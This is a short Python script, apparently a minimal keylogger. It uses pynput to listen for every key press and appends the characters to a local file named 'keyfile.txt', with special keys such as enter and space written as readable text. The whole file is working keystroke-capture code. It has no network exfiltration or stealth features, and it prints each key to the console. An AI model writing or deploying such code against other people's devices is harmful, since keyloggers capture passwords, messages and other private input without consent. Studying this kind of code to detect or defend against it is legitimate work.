from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char 
            logKey.write(char)
        except AttributeError:
            
            if key == keyboard.Key.space:
                logKey.write(' ')  
            elif key == keyboard.Key.enter:
                logKey.write('\n')  
            else:
                logKey.write(f' [{key}] ') 
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()